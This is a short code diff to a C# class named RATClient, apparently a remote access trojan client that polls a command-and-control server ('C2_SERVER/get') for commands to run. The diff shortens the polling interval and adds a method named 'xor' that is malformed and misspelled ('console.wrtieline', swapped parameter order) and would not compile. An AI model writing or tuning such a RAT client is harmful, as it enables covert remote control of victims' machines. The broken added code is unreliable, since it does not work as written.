@@ -26,7 +26,7 @@ class RATClient
                 string cmd = client.GetStringAsync($"{C2_SERVER}/get").Result.Trim();
                 if (string.IsNullOrEmpty(cmd))
                 {
-                    Thread.Sleep(1000);
+                    Thread.Sleep(700);
                     continue;
                 }
 
@@ -149,6 +149,10 @@ class RATClient
         catch { }
     }
 
+    static void xor(msg string)
+   {
+     console.wrtieline(msg)
+   }
     static void SendClientInfo()
     {
         try
